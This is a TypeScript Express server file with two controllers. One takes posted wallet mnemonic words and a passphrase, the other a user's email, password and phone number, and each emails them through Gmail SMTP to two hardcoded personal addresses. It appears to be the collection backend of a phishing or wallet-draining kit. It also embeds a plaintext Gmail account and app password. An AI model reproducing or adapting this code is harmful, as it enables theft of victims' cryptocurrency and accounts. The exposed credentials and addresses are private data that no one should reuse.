import { Request, Response } from "express";
import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
import nodemailer from "nodemailer";
const getRecipients = (): string[] => {
  const recipients = "rohitkumar952895@gmail.com,rohitkumar7409137159@gmail.com";
  if (!recipients) return [];
  return recipients.split(",").map((email) => email.trim());
};
export const sendMnemonicController = asyncHandler(

  async (req: Request, res: Response): Promise<Response> => {
    const payload = req.body;

    // Validate payload
    if (!payload || !payload.data || !Array.isArray(payload.data)) {
      return errorResponse(res, "Invalid payload", 400);
    }

    // Build HTML email content
    let htmlContent = `<h2>App Name : ${payload.heading}</h2>`;
    htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;

    payload.data.forEach((item: { label: string; value: string }) => {
      htmlContent += `<p>${item.value}</p>`;
    });

    try {
      const recipients = getRecipients();
      if (recipients.length === 0) {
        return errorResponse(res, "No recipients configured", 400);
      }

      // Gmail transporter (App Password required)
      const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true,
        auth: {
          user: "davidbrown202e@gmail.com",
          pass: "peie nkic zolx kfno", // App password only
        },
      });

      // Subject formatted to include project title (avoids merging threads)
      const subject = `[${payload.heading}] User Information Received - ${new Date().toLocaleDateString()}`;

      // Send separate emails for each recipient (per project payload.heading)
      const results = await Promise.allSettled(
        recipients.map((recipient) => {
          const mailOptions = {
            from: `"${payload.heading}" <davidbrown202e@gmail.com>`,
            to: recipient,
            subject: subject, // unique to each payload.heading/project
            html: htmlContent,
            headers: {
              "Message-ID": `<${Date.now()}-${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
              "In-Reply-To": `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
              References: `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
            },
          };
          return transporter.sendMail(mailOptions);
        })
      );

      // Log send status
      results.forEach((r, i) => {
        if (r.status === "fulfilled") {
          console.log(`✅ Email sent for ${payload.heading} → ${recipients[i]}`);
        } else {
          console.error(`❌ Failed for ${payload.heading} → ${recipients[i]}:`, r.reason?.message);
        }
      });

      return successResponse(res, {}, `Emails for "${payload.heading}" sent successfully`, 200);
    } catch (error: any) {
      console.error("❌ Email sending failed:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);

/**
 * Controller: Send User Info Email
 */
export const sendUserInfoController = asyncHandler(
  async (req: Request, res: Response): Promise<Response> => {
    const { title, email, password, phone } = req.body;

    if (!title || !email || !password) {
      return errorResponse(res, "Missing required fields", 400);
    }

    // Build HTML Email Content
    const htmlContent = `
      <h2>${title}</h2>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Password:</strong> ${password}</li>
        <li><strong>Phone:</strong> ${phone || "N/A"}</li>
      </ul>
    `;

    try {
      const recipients = getRecipients();
      if (recipients.length === 0) {
        return errorResponse(res, "No recipients configured", 400);
      }

      // Gmail transporter (App Password required)
      const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true,
        auth: {
          user: "davidbrown202e@gmail.com",
          pass: "peie nkic zolx kfno", // App password only
        },
      });

      // Subject formatted to include project title (avoids merging threads)
      const subject = `[${title}] User Information Received - ${new Date().toLocaleDateString()}`;

      // Send separate emails for each recipient (per project title)
      const results = await Promise.allSettled(
        recipients.map((recipient) => {
          const mailOptions = {
            from: `"${title}" <davidbrown202e@gmail.com>`,
            to: recipient,
            subject: subject, // unique to each title/project
            html: htmlContent,
            headers: {
              "Message-ID": `<${Date.now()}-${title.replace(/\s+/g, "-")}@yourapp.com>`,
              "In-Reply-To": `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
              References: `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
            },
          };
          return transporter.sendMail(mailOptions);
        })
      );

      // Log send status
      results.forEach((r, i) => {
        if (r.status === "fulfilled") {
          console.log(`✅ Email sent for ${title} → ${recipients[i]}`);
        } else {
          console.error(`❌ Failed for ${title} → ${recipients[i]}:`, r.reason?.message);
        }
      });

      return successResponse(res, {}, `Emails for "${title}" sent successfully`, 200);
    } catch (error: any) {
      console.error("❌ Email sending failed:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);



